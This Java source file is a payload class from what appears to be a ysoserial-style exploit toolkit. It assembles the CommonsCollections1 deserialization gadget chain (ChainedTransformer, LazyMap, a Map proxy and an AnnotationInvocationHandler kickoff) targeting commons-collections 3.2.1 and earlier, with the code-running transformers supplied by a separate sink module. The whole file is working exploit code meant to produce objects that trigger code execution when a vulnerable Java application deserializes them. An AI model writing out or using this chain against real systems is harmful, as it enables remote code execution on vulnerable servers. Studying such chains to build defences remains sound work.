package com.ppp.chain.collections3;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annatation.Authors;
import com.ppp.annatation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Gadgets;
import com.ppp.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 */
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Authors({Authors.FROHOFF})
@Sink({Sink.InvokerTransformer3})
public class CommonsCollections1 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections1.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.make(sinksHelper);

        Object kickOffObject = getChain((Transformer[]) sinkObject);

        return kickOffObject;
    }

    public Object getChain(Transformer[] transformers) throws Exception {
        // chain
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // kickoff
        Object annotationInvocationHandler = KickOff.annotationInvocationHandler(mapProxy);

        return annotationInvocationHandler;
    }
}
